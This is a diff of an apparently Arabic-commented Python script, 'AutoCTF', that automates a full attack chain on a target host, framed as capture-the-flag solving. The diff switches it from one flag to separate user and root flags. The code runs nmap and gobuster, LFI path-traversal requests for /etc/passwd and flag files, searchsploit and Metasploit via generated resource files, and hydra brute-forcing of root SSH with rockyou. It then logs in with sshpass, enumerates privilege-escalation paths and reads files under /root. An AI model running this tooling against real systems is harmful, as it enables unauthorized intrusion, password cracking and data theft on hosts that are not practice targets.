@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ==========================================
-# AutoCTF - Solver آلي كامل للوصول إلى العلم
+# AutoCTF - البحث عن user.flag و root.flag
 # ==========================================
 
 import os
@@ -29,7 +29,8 @@ class AutoCTF:
         self.services = {}
         self.web_dirs = []
         self.shell = None
-        self.flag = None
+        self.user_flag = None
+        self.root_flag = None
         self.log = []
     
     def log_step(self, message):
@@ -50,7 +51,6 @@ class AutoCTF:
     def nmap_scan(self):
         self.log_step("بدء فحص Nmap")
         output = self.run_command(f"nmap -sC -sV -p- --min-rate=1000 {self.target}")
-        # استخراج المنافذ المفتوحة والخدمات
         for line in output.splitlines():
             m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
             if m:
@@ -70,10 +70,8 @@ class AutoCTF:
         protocol = 'http' if port == '80' else 'https'
         url = f"{protocol}://{self.target}"
         self.log_step(f"بدء تعداد الدلائل على {url}")
-        # استخدام gobuster
         wordlist = "/usr/share/wordlists/dirb/common.txt"
         output = self.run_command(f"gobuster dir -u {url} -w {wordlist} -t 50")
-        # استخراج الدلائل التي تعيد 200
         dirs = re.findall(r'/(\w+)/?\s+\(Status: 200\)', output)
         self.web_dirs = dirs
         self.log_step(f"الدلائل المكتشفة: {self.web_dirs}")
@@ -83,7 +81,6 @@ class AutoCTF:
         for dir in self.web_dirs:
             if 'index' in dir or 'admin' in dir or 'include' in dir:
                 self.log_step(f"محاولة LFI في {dir}")
-                # اختبار LFI بسيط
                 test_url = f"http://{self.target}/{dir}/?page=../../../../etc/passwd"
                 out = self.run_command(f"curl -s {test_url}")
                 if "root:" in out:
@@ -95,26 +92,33 @@ class AutoCTF:
         for dir in self.web_dirs:
             if 'upload' in dir:
                 self.log_step(f"محاولة استغلال رفع ملفات في {dir}")
-                # محاولة رفع شيل بسيط (يحتاج إلى تحليل أكثر تعقيداً)
-                # هنا نكتفي بالإشارة
                 return f"http://{self.target}/{dir}"
         return None
     
     def exploit_web(self):
         lfi = self.check_lfi()
         if lfi:
-            # قراءة الملفات الحساسة
-            pass
+            # يمكن قراءة ملفات العلم عبر LFI
+            self.log_step("محاولة قراءة user.flag عبر LFI")
+            user_flag_url = f"{lfi}&file=../../../home/user/user.flag"  # افتراض المسار
+            out = self.run_command(f"curl -s {user_flag_url}")
+            if out and "flag" in out:
+                self.user_flag = out.strip()
+                self.log_step(f"وجدنا user.flag: {self.user_flag}")
+            
+            root_flag_url = f"{lfi}&file=../../../root/root.flag"
+            out = self.run_command(f"curl -s {root_flag_url}")
+            if out and "flag" in out:
+                self.root_flag = out.strip()
+                self.log_step(f"وجدنا root.flag: {self.root_flag}")
         upload = self.check_upload()
         if upload:
             self.log_step("صفحة رفع ملفات موجودة، يمكن محاولة رفع شيل")
             # يمكن إضافة كود لرفع شيل آلياً
-        # يمكن إضافة المزيد من الفحوصات مثل SQLi, XSS...
     
     def search_exploit(self, service, version=""):
         self.log_step(f"البحث عن استغلال لـ {service} {version}")
         output = self.run_command(f"searchsploit {service} {version}")
-        # تحليل النتائج واختيار أول استغلال
         lines = output.splitlines()
         exploits = []
         for line in lines:
@@ -130,9 +134,6 @@ class AutoCTF:
     
     def try_exploit(self, exploit_name, port):
         self.log_step(f"محاولة تشغيل الاستغلال {exploit_name} على المنفذ {port}")
-        # هذا الجزء يعتمد على نوع الاستغلال (يدوي أو metasploit)
-        # نفترض أن الاستغلال من نوع metasploit
-        # يمكن تشغيل msfconsole بأوامر مساعدة
         rc_file = tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False)
         rc_file.write(f"use {exploit_name}\n")
         rc_file.write(f"set RHOSTS {self.target}\n")
@@ -144,8 +145,6 @@ class AutoCTF:
         rc_file.close()
         output = self.run_command(f"msfconsole -q -r {rc_file.name}")
         os.unlink(rc_file.name)
-        # هنا يجب التحقق من نجاح الاستغلال (مثلاً بفحص الاتصال)
-        # سنفترض أنه نجح إذا ظهرت جلسة
         if "Meterpreter session" in output or "Command shell session" in output:
             self.log_step("الاستغلال نجح!")
             return True
@@ -156,7 +155,6 @@ class AutoCTF:
             return False
         self.log_step("بدء هجوم قاموس على SSH")
         wordlist = "/usr/share/wordlists/rockyou.txt"
-        # اختصاراً، نستخدم المستخدم root
         output = self.run_command(f"hydra -l root -P {wordlist} ssh://{self.target} -t 4 -o hydra_result.txt")
         with open('hydra_result.txt') as f:
             data = f.read()
@@ -170,19 +168,16 @@ class AutoCTF:
     def get_shell_via_ssh(self, creds):
         user, pwd = creds
         self.log_step("محاولة الاتصال عبر SSH")
-        # يمكن استخدام paramiko أو subprocess مع sshpass
         cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no {user}@{self.target} 'whoami'"
         output = self.run_command(cmd)
         if user in output:
             self.log_step("اتصال SSH ناجح")
-            # الآن لدينا شيل
             self.shell = f"ssh {user}@{self.target}"
             return True
         return False
     
     def privesc_linux(self):
         self.log_step("بدء رفع الصلاحيات على لينكس")
-        # بعد الحصول على شيل، ننفذ أوامر لجمع المعلومات
         commands = [
             "whoami",
             "id",
@@ -195,41 +190,58 @@ class AutoCTF:
             "ls -la /root"
         ]
         for cmd in commands:
-            # تنفيذ عبر ssh إذا كان متاحاً
             if self.shell:
                 full_cmd = f"ssh {self.shell.split()[-1]} '{cmd}'"
                 out = self.run_command(full_cmd)
                 self.log_step(f"نتيجة {cmd}:\n{out[:200]}")
-                # تحليل النتائج
                 if 'sudo' in out and 'NOPASSWD' in out:
                     self.log_step("يمكن استغلال sudo")
                 if '4000' in out:
                     self.log_step("لدينا SUID binaries، تحقق من GTFOBins")
-        # محاولة استغلال شائع مثل CVE-2021-3156 (sudo Baron Samedit)
-        # هذا يتطلب تنزيل كود استغلال وتنفيذه
-        self.log_step("محاولة استغلال sudoedit")
-        # ... يمكن إضافة كود استغلال
+        
+        # محاولة استغلال شائع
+        self.log_step("محاولة استغلال sudoedit (CVE-2021-3156) إذا كان متاحاً")
+        # يمكن تنزيل وتنفيذ استغلال
     
-    def search_flag(self):
-        self.log_step("البحث عن العلم")
-        locations = [
-            "/root/flag.txt",
-            "/root/flag",
-            "/home/*/flag.txt",
-            "/home/*/flag",
-            "/flag.txt",
-            "/flag",
-            "/var/www/flag.txt",
-            "/tmp/flag"
-        ]
-        for loc in locations:
-            if self.shell:
-                out = self.run_command(f"ssh {self.shell.split()[-1]} 'cat {loc}' 2>/dev/null")
-                if out and not "No such file" in out:
-                    self.flag = out.strip()
-                    self.log_step(f"وجدنا العلم في {loc}: {self.flag}")
-                    return True
-        return False
+    def search_flags(self):
+        self.log_step("البحث عن user.flag و root.flag")
+        locations = {
+            "user": [
+                "/home/*/user.flag",
+                "/home/*/user.txt",
+                "/home/*/flag.txt",
+                "/home/*/flag",
+                "/var/www/user.flag",
+                "/tmp/user.flag"
+            ],
+            "root": [
+                "/root/root.flag",
+                "/root/root.txt",
+                "/root/flag.txt",
+                "/root/flag",
+                "/root/.flag"
+            ]
+        }
+        
+        if self.shell:
+            ssh_cmd = f"ssh {self.shell.split()[-1]}"
+            # البحث عن علم المستخدم
+            for loc in locations["user"]:
+                out = self.run_command(f"{ssh_cmd} 'cat {loc}' 2>/dev/null")
+                if out and not "No such file" in out and len(out.strip()) > 0:
+                    self.user_flag = out.strip()
+                    self.log_step(f"وجدنا user.flag في {loc}: {self.user_flag}")
+                    break
+            
+            # البحث عن علم الجذر
+            for loc in locations["root"]:
+                out = self.run_command(f"{ssh_cmd} 'cat {loc}' 2>/dev/null")
+                if out and not "No such file" in out and len(out.strip()) > 0:
+                    self.root_flag = out.strip()
+                    self.log_step(f"وجدنا root.flag في {loc}: {self.root_flag}")
+                    break
+        else:
+            self.log_step("لا يوجد شيل، تخطي البحث عن الأعلام")
     
     def run(self):
         self.log_step("بدء الهجوم التلقائي على " + self.target)
@@ -245,13 +257,11 @@ class AutoCTF:
         # 3. محاولة استغلال الخدمات الأخرى
         for port, service in self.services.items():
             if service == 'ssh':
-                # محاولة هجوم قاموس أولاً
                 creds = self.brute_force_ssh()
                 if creds:
                     if self.get_shell_via_ssh(creds):
                         break
                 else:
-                    # البحث عن استغلال
                     exploit = self.search_exploit('openssh')
                     if exploit:
                         if self.try_exploit(exploit, port):
@@ -260,26 +270,30 @@ class AutoCTF:
                 # محاولة anonymous
                 pass
             elif service in ['http', 'https']:
-                continue  # تم التعامل معه
+                continue
             else:
-                # محاولة استغلال عام
                 exploit = self.search_exploit(service)
                 if exploit:
                     self.try_exploit(exploit, port)
         
-        # 4. إذا حصلنا على شيل، نبدأ رفع الصلاحيات والبحث عن العلم
+        # 4. إذا حصلنا على شيل، نبدأ رفع الصلاحيات والبحث عن الأعلام
         if self.shell:
             self.privesc_linux()
-            self.search_flag()
+            self.search_flags()
         else:
-            self.log_step("لم نتمكن من الحصول على شيل. انتهى.")
+            self.log_step("لم نتمكن من الحصول على شيل.")
         
         # 5. عرض النتائج
         print(f"\n{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
-        if self.flag:
-            print(f"{Colors.BOLD}FLAG: {self.flag}{Colors.ENDC}")
+        if self.user_flag:
+            print(f"{Colors.BOLD}user.flag: {self.user_flag}{Colors.ENDC}")
         else:
-            print("لم نعثر على العلم.")
+            print("لم نعثر على user.flag.")
+        
+        if self.root_flag:
+            print(f"{Colors.BOLD}root.flag: {self.root_flag}{Colors.ENDC}")
+        else:
+            print("لم نعثر على root.flag.")
         
         # حفظ السجل
         with open("autoctf_log.txt", "w") as f:
